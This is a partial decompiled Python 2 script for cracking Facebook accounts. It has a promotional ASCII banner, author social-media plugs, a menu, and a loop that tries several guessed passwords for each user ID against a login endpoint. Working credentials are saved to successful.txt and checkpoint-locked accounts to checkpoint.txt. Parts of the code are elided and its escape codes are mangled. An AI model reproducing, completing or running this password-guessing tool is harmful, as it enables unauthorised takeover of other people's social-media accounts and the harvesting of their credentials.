# decompile by sherhacker
# source code by sherbadshah
...
'/x1b[1;97m'██████╦╝██║░░██║██████╔╝██████╔╝██║░░██║██║░░██║
'/x1b[1;97m'╚═════╝░╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝
'/x1b[1;97m'.'/x1b[1;97m'Github'/x1b[1;97m'https://github.com/sher hacker174
'/x1b[1;97m' '/x1b[1;97m'PROGRAMMER'/x1b[1;97m'sher badsah  
'/x1b[1;97m''/x1b[1;97m'YOUTUBE CHANNEL'/x1b[1;97m'Technical sher badshah
 '/x1b[1;97m''/x1b[1;97m'FACEBOOK'/x1b[1;97m'sher badshah
'/x1b[1;97m' ----------------------------------------------sherbadshah-----------------------------------------------------------------------------'/x1b[1;97m''/x1b[1;97m''/x1b[1;97m'
'/x1b[1;97m' ----------------------------------------------sher hacker-------------------------------------------------------------------------------'/x1b[1;97m''/x1b[1;97m''/x1b[1;97m'
'/x1b[1;97m' -----+++++++++++++++++++++I LOVE YOU PAKISTAN+++++++++++++++++++++++++++++++'/x1b[1;97m''/x1b[1;97m''/x1b[1;97m'
...
def reg():
    ...
    print ''
    print ''
    print '\x1b[1;92m  [Connected With sher badshah Servers]'
    print ''
...
def reg2():
    ...
    print ''
    print '\x1b[1;96m '
    print ' \xe2\x80\xa2 THIS TOOL IS COMPLETELY CODED BY sher badshah \xe2\x80\xa2 '
    time.sleep(5)
    login()
...
def menu():
    ...
    print ''
    print ' [1] START'
    print ' [2] FOLLOW sher badshah ON FB '
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[sher-OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;91m[sher-Cp] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[sher-OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;91m[sher-Cp] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[sher-OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;91m[sher-Cp] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[sher-OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;91m[sher-Cp] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
